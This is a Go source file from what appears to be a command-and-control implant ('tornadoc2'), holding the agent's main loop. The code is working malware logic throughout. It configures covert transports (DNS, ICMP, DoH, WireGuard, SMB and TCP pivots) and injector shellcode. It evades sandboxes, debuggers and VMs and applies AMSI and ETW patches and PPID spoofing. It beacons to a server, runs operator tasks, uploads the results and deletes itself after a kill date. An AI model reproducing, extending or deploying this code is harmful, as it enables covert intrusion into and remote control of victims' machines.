//go:build linux

package core

import (
	"crypto/ecdsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"math/rand"
	"os"
	"runtime"
	"strings"
	"time"
	"tornadoc2/agent/evasion"
	"tornadoc2/agent/platform"
	"tornadoc2/agent/protocol"
)

var mainPanics int

func Main(cfg Config) {
	defer func() {
		if r := recover(); r != nil && mainPanics < 3 {
			mainPanics++
			diag("[core] FATAL panic: %v; restarting (%d/3)\n",
				r, mainPanics)
			time.Sleep(2 * time.Second)
			Main(cfg)
		}
	}()
	if evasion.RunMaskHelper() {
		return
	}
	setProcessName()
	if platform.IsWorkerMode() {
		platform.RunWorker()
		return // unreachable; RunWorker calls os.Exit
	}

	diag("[core] === agent starting ===\n")
	diag("[core] target os=%s arch=%s\n",
		platformName, runtime.GOARCH)

	DefaultURL = cfg.DefaultURL
	DefaultProfile = cfg.DefaultProfile
	ServerPubKeyPem = cfg.ServerPubKeyPem
	ClientCertPem = cfg.ClientCertPem
	ClientKeyPem = cfg.ClientKeyPem
	RootCAPem = cfg.RootCAPem
	ProfileJSON = cfg.ProfileJSON
	AgentPrivKeyPem = cfg.AgentPrivKeyPem

	TransportMode = cfg.TransportMode
	DNSDomain = cfg.DNSDomain
	DNSResolver = cfg.DNSResolver
	ICMPHost = cfg.ICMPHost
	DoHResolver = cfg.DoHResolver
	DoHHostHeader = cfg.DoHHostHeader
	DoHUserAgent = cfg.DoHUserAgent

	WebSocketURL = cfg.WebSocketURL

	WireGuardServerPubKey = cfg.WireGuardServerPubKey
	WireGuardServerAddr = cfg.WireGuardServerAddr
	WireGuardAgentPrivKey = cfg.WireGuardAgentPrivKey
	WireGuardTunnelIP = cfg.WireGuardTunnelIP
	WireGuardServerTunnelIP = cfg.WireGuardServerTunnelIP
	WireGuardInnerPort = cfg.WireGuardInnerPort

	SMBPipe = cfg.SMBPipe
	SMBRelayPipe = cfg.SMBRelayPipe

	TCPBindAddr = cfg.TCPBindAddr
	TCPBindToken = cfg.TCPBindToken
	TCPRelayTarget = cfg.TCPRelayTarget
	TCPRelayToken = cfg.TCPRelayToken

	TCPRevListen = cfg.TCPRevListen
	TCPRevTarget = cfg.TCPRevTarget
	TCPRevToken = cfg.TCPRevToken

	ServerECDHPubkey = cfg.ServerECDHPubkey
	ObfKeyHex = cfg.ObfKeyHex
	SleepMaskType = cfg.SleepMaskType
	SyscallMethod = cfg.SyscallMethod

	PivotPrivKeyB64 = cfg.PivotPrivKeyB64
	PivotPubKeyB64 = cfg.PivotPubKeyB64
	IdentityRole = cfg.IdentityRole

	InjectorShellcodeB64 = cfg.InjectorShellcodeB64
	InjectMethodDefault = cfg.InjectMethod

	DefaultSleepSeconds = cfg.DefaultSleepSeconds
	DefaultJitter = cfg.DefaultJitter
	KillDays = cfg.KillDays
	TransportFailoverAfter = cfg.TransportFailoverAfter
	protocol.WorkHoursStart = cfg.WorkHoursStart
	protocol.WorkHoursEnd = cfg.WorkHoursEnd
	protocol.WireTLSProfile = cfg.TLSProfile

	protocol.DNSVerbB = cfg.DNSVerbB
	protocol.DNSVerbT = cfg.DNSVerbT
	protocol.DNSVerbR = cfg.DNSVerbR
	protocol.DNSPayloadChunkSize = cfg.DNSPayloadChunkSize

	AntiSandboxEnabled = cfg.AntiSandbox
	SleepMaskEnabled = cfg.SleepMask
	AmsiBypass = cfg.AmsiBypass
	EtwPatch = cfg.EtwPatch
	StringObfuscation = cfg.StringObfuscation
	PpidSpoof = cfg.PpidSpoof
	AntiDebug = cfg.AntiDebug
	AntiVm = cfg.AntiVM
	Verbose = cfg.Verbose

	diag("[core] config: transport=%q url=%q dns_zone=%q "+
		"icmp_host=%q smb_pipe=%q tcp_bind=%q ws_url=%q\n",
		TransportMode, DefaultURL, DNSDomain,
		ICMPHost, SMBPipe, TCPBindAddr, WebSocketURL)
	diag("[core] config: wg_server_addr=%q wg_tunnel_ip=%q "+
		"wg_has_pubkey=%v wg_has_privkey=%v\n",
		WireGuardServerAddr, WireGuardTunnelIP,
		WireGuardServerPubKey != "", WireGuardAgentPrivKey != "")
	diag("[core] config: tls_profile=%q kill_days=%d "+
		"work_hours=%02d:%02d-%02d:%02d failover_after=%d\n",
		cfg.TLSProfile, KillDays,
		protocol.WorkHoursStart/60, protocol.WorkHoursStart%60,
		protocol.WorkHoursEnd/60, protocol.WorkHoursEnd%60,
		TransportFailoverAfter)
	diag("[core] config: server_pubkey=%v agent_privkey=%v "+
		"server_ecdh=%v pivot_priv=%v pivot_pub=%v\n",
		ServerPubKeyPem != "", AgentPrivKeyPem != "",
		ServerECDHPubkey != "", PivotPrivKeyB64 != "",
		PivotPubKeyB64 != "")
	diag("[core] config: inject_shellcode=%v inject_method=%q\n",
		InjectorShellcodeB64 != "", InjectMethodDefault)
	diag("[core] config: opsec antisanbox=%v sleepmask=%q "+
		"amsi=%v etw=%v ppid=%v antidebug=%v antivm=%v\n",
		AntiSandboxEnabled, SleepMaskType, AmsiBypass,
		EtwPatch, PpidSpoof, AntiDebug, AntiVm)

	evasion.SetSyscallMethod(SyscallMethod)

	if ObfKeyHex != "" {
		diag("[core] deobfuscating %d values with key\n",
			len(ObfKeyHex)/2)
		DefaultURL = deobf(DefaultURL, ObfKeyHex)
		ProfileJSON = deobf(ProfileJSON, ObfKeyHex)
		ICMPHost = deobf(ICMPHost, ObfKeyHex)
		DoHResolver = deobf(DoHResolver, ObfKeyHex)
		DoHHostHeader = deobf(DoHHostHeader, ObfKeyHex)
		DoHUserAgent = deobf(DoHUserAgent, ObfKeyHex)
		WebSocketURL = deobf(WebSocketURL, ObfKeyHex)
		diag("[core] deobfuscated url=%q\n", DefaultURL)
	}

	diag("[core] running OPSEC checks\n")
	if AntiSandboxEnabled {
		if evasion.SandboxDetected() {
			diag("[core] sandbox detected — sleeping then checking again\n")
			sleep := time.Duration(4+rand.Intn(4)) * time.Hour
			time.Sleep(sleep)
			if evasion.SandboxDetected() {
				diag("[core] sandbox still detected — exiting\n")
				os.Exit(0)
			}
		}
		diag("[core] sandbox check passed\n")
	}
	if AntiDebug {
		if evasion.DebuggerDetected() {
			diag("[core] debugger detected — exiting\n")
			os.Exit(0)
		}
		diag("[core] debugger check passed\n")
	}
	if AntiVm {
		if evasion.InVM() {
			diag("[core] VM detected — exiting\n")
			os.Exit(0)
		}
		diag("[core] VM check passed\n")
	}
	if isWindows {
		if PpidSpoof {
			diag("[core] attempting PPID spoof\n")
			spawned, err := evasion.PPIDSpoof()
			if err == nil && spawned {
				diag("[core] PPID spoof respawned — parent exiting\n")
				os.Exit(0)
			}
		}
		if AmsiBypass || EtwPatch {
			diag("[core] applying Windows evasion amsi=%v etw=%v\n",
				AmsiBypass, EtwPatch)
			evasion.ApplyWindowsEvasion(AmsiBypass, EtwPatch)
		}
	}

	diag("[core] constructing agent\n")
	agent, err := newAgent(cfg)
	if err != nil {
		diag("[core] agent construction failed: %v\n", err)
		os.Exit(1)
	}
	diag("[core] agent constructed: %d transport(s) %v\n",
		len(agent.transports), agent.transportNames)

	signalMigrateReady()
	diag("[core] migrate-ready signal sent (no-op if not migrated)\n")

	if SMBRelayPipe != "" {
		diag("[core] starting SMB pivot listener on %q\n",
			SMBRelayPipe)
		if agent.pivotPriv == nil {
			diag("[core] smb pivot listener requires pivot " +
				"private key; not started\n")
		} else {
			relay, err := newSMBRelay(agent, SMBRelayPipe,
				agent.pivotPriv)
			if err != nil {
				diag("[core] smb pivot: %v\n", err)
			} else if err := relay.start(); err != nil {
				diag("[core] smb pivot failed to start: %v\n", err)
			} else {
				diag("[core] smb pivot listening\n")
			}
		}
	}
	if TCPRelayTarget != "" {
		diag("[core] starting TCP pivot listener target=%q\n",
			TCPRelayTarget)
		if TCPRelayToken == "" {
			diag("[core] tcp pivot: no token; skipping\n")
		} else if agent.pivotPriv == nil {
			diag("[core] tcp pivot listener requires pivot " +
				"private key; not started\n")
		} else {
			relay := newTCPRelay(agent, TCPRelayTarget,
				TCPRelayToken, agent.pivotPriv)
			if err := relay.start(); err != nil {
				diag("[core] tcp pivot failed: %v\n", err)
			}
		}
	}
	if TCPRevListen != "" {
		diag("[core] starting TCP reverse pivot listener on %q\n",
			TCPRevListen)
		if TCPRevToken == "" {
			diag("[core] tcp reverse pivot: no token; " +
				"skipping\n")
		} else if agent.pivotPriv == nil {
			diag("[core] tcp reverse pivot listener requires " +
				"pivot private key; not started\n")
		} else {
			relay, err := newTCPRevRelay(agent, TCPRevListen,
				TCPRevToken, agent.pivotPriv)
			if err != nil {
				diag("[core] tcp reverse pivot: %v\n", err)
			} else if err := relay.start(); err != nil {
				diag("[core] tcp reverse pivot failed: %v\n",
					err)
			}
		}
	}

	diag("[core] entering agent run loop\n")
	agent.run()
	diag("[core] agent run loop returned — exiting\n")
}
func (a *Agent) advanceTransport() {
	if len(a.transports) <= 1 {
		return
	}
	failures := a.transportFailures
	a.transportIndex = (a.transportIndex + 1) % len(a.transports)
	a.transport = a.transports[a.transportIndex]
	a.transportFailures = 0
	diag("[transport] failed %d consecutive times; "+
		"rotating to %q (index %d/%d)\n",
		failures, a.transportNames[a.transportIndex],
		a.transportIndex, len(a.transports))
}
func (a *Agent) run() {
	initialDelay := time.Duration(2+a.rngIntn(16)) * time.Second
	diag("[run] waiting %v before first check-in\n", initialDelay)
	time.Sleep(initialDelay)

	backoff := time.Second * 5
	attempt := 0
	for {
		attempt++
		diag("[run] check-in attempt #%d (transport=%q)\n",
			attempt, a.transportNames[a.transportIndex])
		err := a.checkin()
		if err == nil {
			diag("[run] initial check-in succeeded on attempt #%d\n",
				attempt)
			break
		}
		diag("[run] check-in #%d failed: %v (retry in %v)\n",
			attempt, err, backoff)
		if !a.deadline.IsZero() && time.Now().After(a.deadline) {
			diag("[run] kill deadline passed during initial " +
				"check-in; self-deleting\n")
			_ = platform.SelfDelete()
			return
		}
		time.Sleep(backoff)
		if backoff < time.Minute*5 {
			backoff *= 2
		}
	}

	diag("[run] work hours: %s (local %02d:%02d)\n",
		formatWorkHours(), time.Now().Hour(), time.Now().Minute())

	loop := 0
	for {
		loop++
		diag("[run] loop iteration #%d\n", loop)

		if !a.deadline.IsZero() && time.Now().After(a.deadline) {
			diag("[run] kill deadline passed — self-deleting and exiting\n")
			_ = platform.SelfDelete()
			return
		}

		if !insideWorkHours(time.Now()) {
			diag("[run] outside work hours — sleeping 60s\n")
			for i := 0; i < 60; i++ {
				if !a.deadline.IsZero() &&
					time.Now().After(a.deadline) {
					break
				}
				time.Sleep(time.Second)
			}
			continue
		}

		a.flushPendingResults()
		a.safeStep(func() { a.pollAndRun() })
		a.safeStep(func() { a.sleep() })
	}
}

// safeStep keeps a panic in one loop phase from killing the
// beacon. The next iteration re-enters the normal schedule.
func (a *Agent) safeStep(fn func()) {
	defer func() {
		if r := recover(); r != nil {
			diag("[run] PANIC in loop step: %v\n", r)
			time.Sleep(2 * time.Second)
		}
	}()
	fn()
}
func (a *Agent) checkin() (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("checkin panicked: %v", r)
			diag("[checkin] PANIC: %v\n", r)
		}
	}()
	if a.session.ID != 0 {
		diag("[checkin] re-checking in (previous id %d)\n",
			a.session.ID)
	}

	a.identity.WorkStart = protocol.WorkHoursStart
	a.identity.WorkEnd = protocol.WorkHoursEnd
	a.identity.Groups = nil
	fillIdentityExtra(&a.identity)

	pubkey := ""
	var identitySig string
	var identityTs int64
	if a.agentPriv != nil {
		pubDER, err := x509.MarshalPKIXPublicKey(&a.agentPriv.PublicKey)
		if err == nil {
			pubPEM := pem.EncodeToMemory(&pem.Block{
				Type:  "PUBLIC KEY",
				Bytes: pubDER,
			})
			pubkey = string(pubPEM)

			identityTs = time.Now().Unix()
			payload := []byte(fmt.Sprintf(
				"%s|%s|%s|%s|%d",
				a.identity.MachineID,
				a.identity.Hostname,
				a.identity.Username,
				a.identity.OS,
				identityTs))
			sig, serr := SignPayload(a.agentPriv, payload)
			if serr == nil {
				identitySig = base64.StdEncoding.EncodeToString(sig)
				diag("[checkin] identity signature generated "+
					"(%d bytes)\n", len(sig))
			} else {
				diag("[checkin] identity signature failed: %v\n",
					serr)
			}
		} else {
			diag("[checkin] failed to marshal agent public key: %v\n",
				err)
		}
	} else {
		diag("[checkin] no agent private key — identity unsigned\n")
	}

	diag("[checkin] calling transport.CheckIn "+
		"identity_sig=%v identity_ts=%d wire=%v\n",
		identitySig != "", identityTs, a.wire != nil)
	t0 := time.Now()
	reply, err := a.transport.CheckIn(
		a.identity, pubkey, identitySig, identityTs, a.wire)
	elapsed := time.Since(t0)

	if err != nil {
		diag("[checkin] transport returned error after %v: %v\n",
			elapsed, err)
		if strings.Contains(err.Error(), "403") {
			diag("[checkin] 403 refusal — exiting\n")
			os.Exit(1)
		}
		if TransportFailoverAfter > 0 &&
			isTransportFailure(err.Error()) {
			a.transportFailures++
			diag("[checkin] transport failure #%d/%d\n",
				a.transportFailures, TransportFailoverAfter)
			if a.transportFailures >= TransportFailoverAfter {
				a.advanceTransport()
			}
		}
		return err
	}

	a.transportFailures = 0
	a.session = *reply
	diag("[checkin] SUCCESS in %v — session id=%d sleep=%d "+
		"jitter=%.2f proto=%d cookie=%v\n",
		elapsed, reply.ID, reply.Sleep, reply.Jitter,
		reply.Proto, reply.Cookie != "")
	return nil
}
func (a *Agent) pollAndRun() {
	diag("[poll] starting task fetch\n")
	t0 := time.Now()
	tasks, err := a.fetchTasks()
	elapsed := time.Since(t0)
	if err != nil {
		diag("[poll] fetch failed after %v: %v\n", elapsed, err)
		if TransportFailoverAfter > 0 &&
			isTransportFailure(err.Error()) {
			a.transportFailures++
			diag("[poll] transport failure #%d/%d\n",
				a.transportFailures, TransportFailoverAfter)
			if a.transportFailures >= TransportFailoverAfter {
				a.advanceTransport()
			}
		}

		msg := err.Error()
		should_recheck :=
			strings.Contains(msg, "status 400") ||
				strings.Contains(msg, "status 401") ||
				strings.Contains(msg, "status 403") ||
				strings.Contains(msg, "status 404") ||
				strings.Contains(msg, "status 500") ||
				strings.Contains(msg, "status 502") ||
				strings.Contains(msg, "status 503") ||
				strings.Contains(msg, "no session cookie") ||
				strings.Contains(msg, "connection refused") ||
				strings.Contains(msg, "no such host") ||
				strings.Contains(msg, "certificate") ||
				strings.Contains(msg, "invalid character") ||
				strings.Contains(msg, "i/o timeout")
		if should_recheck {
			diag("[poll] error matches re-check condition — " +
				"re-checking in\n")
			jitter := time.Duration(a.rngIntn(3000)) * time.Millisecond
			time.Sleep(jitter)
			if err := a.checkin(); err != nil {
				diag("[poll] re-check-in failed: %v\n", err)
			}
		}
		return
	}

	diag("[poll] fetch complete in %v — %d task(s)\n",
		elapsed, len(tasks))
	if len(tasks) == 0 {
		return
	}

	for i, t := range tasks {
		diag("[task %d/%d] id=%s verb=%s args=%v timeout=%d "+
			"signature=%v\n",
			i+1, len(tasks), t.ID, t.Verb, t.Args,
			t.Timeout, t.Signature != "")

		if t.ID == "" || t.Verb == "" {
			diag("[task %d] id or verb empty — skipping\n", i+1)
			continue
		}

		if !a.verifyTask(t) {
			diag("[task %d] SIGNATURE VERIFICATION FAILED — "+
				"dropping task %s verb=%s\n",
				i+1, t.ID, t.Verb)
			continue
		}
		diag("[task %d] signature OK — executing\n", i+1)

		et0 := time.Now()
		result := a.execute(t)
		eelapsed := time.Since(et0)
		diag("[task %d] execute done in %v exit=%d output=%d "+
			"bytes error=%v\n",
			i+1, eelapsed, result.ExitCode,
			len(result.Output), result.Error != "")

		pt0 := time.Now()
		if err := a.postResult(result); err != nil {
			diag("[task %d] RESULT UPLOAD FAILED after %v: %v\n",
				i+1, time.Since(pt0), err)
			a.queueResult(result)
		} else {
			diag("[task %d] result uploaded in %v\n",
				i+1, time.Since(pt0))
		}
	}
}
func (a *Agent) fetchTasks() ([]protocol.Task, error) {
	protocol.ScheduleSleep = -1
	protocol.ScheduleJitter = -1
	protocol.ScheduleKill = 0
	protocol.ScheduleSpawnTo = ""

	tasks, err := a.transport.FetchTasks(a.wire)
	if err != nil {
		return nil, err
	}
	a.transportFailures = 0

	if protocol.ScheduleSleep >= 0 {
		diag("[fetch] server pushed sleep=%d\n",
			protocol.ScheduleSleep)
		a.session.Sleep = protocol.ScheduleSleep
	}
	if protocol.ScheduleJitter >= 0 {
		diag("[fetch] server pushed jitter=%.2f\n",
			protocol.ScheduleJitter)
		a.session.Jitter = protocol.ScheduleJitter
	}
	if protocol.ScheduleKill > 0 {
		diag("[fetch] server pushed kill deadline=%d\n",
			protocol.ScheduleKill)
		a.deadline = time.Unix(protocol.ScheduleKill, 0)
	}
	// Three cases, distinguished by the wire value:
	//
	//   ""   — the header was absent. Leave a.spawnTo alone;
	//          the server has nothing to say on this poll.
	//   "-"  — the server is telling us to clear a
	//          previously-set override. The empty session
	//          value is rendered as "-" on the wire so the
	//          agent can tell "clear" from "no change".
	//   else — an operator-set path, applied verbatim. The
	//          server refuses the reserved word "self" at the
	//          task entry point, so a value reaching this
	//          branch is always a real path on the target.
	switch protocol.ScheduleSpawnTo {
	case "":
	case "-":
		if a.spawnTo != "" {
			diag("[fetch] server cleared spawnto\n")
			a.spawnTo = ""
		}
	default:
		if a.spawnTo != protocol.ScheduleSpawnTo {
			diag("[fetch] server pushed spawnto=%q\n",
				protocol.ScheduleSpawnTo)
			a.spawnTo = protocol.ScheduleSpawnTo
		}
	}
	return tasks, nil
}
func (a *Agent) postResult(r protocol.Result) error {
	if a.agentPriv != nil {
		payload, err := r.Signable()
		if err == nil {
			sig, serr := SignPayload(a.agentPriv, payload)
			if serr == nil {
				r.Signature = base64.StdEncoding.EncodeToString(sig)
				diag("[result] signed %d bytes of canonical form "+
					"with %d-byte signature\n",
					len(payload), len(sig))
			} else {
				diag("[result] signing failed: %v\n", serr)
			}
		} else {
			diag("[result] Signable() failed: %v\n", err)
		}
	} else {
		diag("[result] no agent private key — result unsigned\n")
	}
	var last error
	for attempt := 1; attempt <= 3; attempt++ {
		if err := a.transport.PostResult(r, a.wire); err == nil {
			return nil
		} else {
			last = err
		}
		if attempt < 3 {
			time.Sleep(time.Duration(attempt*attempt) *
				250 * time.Millisecond)
		}
	}
	return last
}

// queueResult keeps an undelivered result for the next loop
// iteration. The queue is bounded so a long outage does not grow
// unbounded memory; the oldest results are dropped first.
func (a *Agent) queueResult(r protocol.Result) {
	a.pendingMu.Lock()
	defer a.pendingMu.Unlock()
	const maxPending = 200
	if len(a.pendingResults) >= maxPending {
		a.pendingResults = a.pendingResults[1:]
		diag("[result] pending queue full; dropped oldest\n")
	}
	a.pendingResults = append(a.pendingResults, r)
}

func (a *Agent) flushPendingResults() {
	for {
		a.pendingMu.Lock()
		if len(a.pendingResults) == 0 {
			a.pendingMu.Unlock()
			return
		}
		r := a.pendingResults[0]
		a.pendingMu.Unlock()

		if err := a.postResult(r); err != nil {
			diag("[result] pending delivery still failing: %v\n", err)
			return
		}
		a.pendingMu.Lock()
		if len(a.pendingResults) > 0 {
			a.pendingResults = a.pendingResults[1:]
		}
		a.pendingMu.Unlock()
	}
}
func (a *Agent) verifyTask(t protocol.Task) bool {
	if a.serverPub == nil {
		diag("[verify] no server public key — accepting "+
			"unsigned task %s\n", t.ID)
		return true
	}
	if t.Signature == "" {
		diag("[verify] task %s has no signature and serverPub "+
			"is set — REFUSING\n", t.ID)
		return false
	}

	sig, err := base64.StdEncoding.DecodeString(t.Signature)
	if err != nil {
		diag("[verify] task %s signature base64 decode failed: %v\n",
			t.ID, err)
		return false
	}

	body, err := t.Unsigned()
	if err != nil {
		diag("[verify] task %s Unsigned() failed: %v\n", t.ID, err)
		return false
	}

	a.signMu.Lock()
	defer a.signMu.Unlock()

	hash := sha256.Sum256(body)
	ok := ecdsa.VerifyASN1(a.serverPub, hash[:], sig)
	diag("[verify] task %s canonical=%s verify=%v\n",
		t.ID, string(body), ok)
	return ok
}
